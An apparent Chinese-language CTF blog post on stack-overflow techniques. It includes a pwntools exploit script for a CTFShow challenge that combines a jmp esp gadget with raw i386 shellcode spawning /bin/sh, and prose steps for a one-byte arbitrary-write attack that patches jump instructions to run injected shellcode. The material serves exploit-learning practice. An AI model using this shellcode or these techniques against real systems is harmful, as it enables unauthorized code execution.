---
title: 花式栈溢出
date: '2025-09-04 16:48:43'
updated: '2025-12-14 18:16:35'
---
## jmp_esp + 栈上shellcode
exp一看就懂，但是真正做题不一定想得出来...

关键点应该是有`jmp esp`这个gadget

```python
from pwn import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386",os = 'linux',log_level = 'debug')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28214)
elf = ELF("./pwn")

jmp_esp = 0x08048d17
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += b"\x0b\xcd\x80"
sub_esp_jmp = asm("sub esp,0x28;jmp esp")

payload = shellcode + b'a' * 15 + p32(jmp_esp) + sub_esp_jmp
io.recvuntil('What\'s your name?')
io.send(payload)
io.interactive()
```

## 任意地址写
### 直接修改binary
不太清楚为啥CTFShow里面这个算花式栈溢出...

这个任意地址写居然还能直接改binary的，好家伙边运行边改机器码

可以随便改binary的话其实应该很多打法，

不知道为什么让我想起来IDA可以用python

ctfshow这题因为只能写一个字节，所以要在任意写后面的jmp指令下手，

整题重点就在这：

![](/images/15873043a003e9d9f6d844b12dccbeb3.png)

1. 把jnz的相对跳转的偏移改到任意写前面，再把jnz改成jmp（必须按顺序分两个字节搞定）
2. 然后再利用任意写在binary里面写shellcode（因为PIE没开，所以程序的地址是知道的）
3. 最后用一个字节把jmp的偏移改到shellcode来getshell

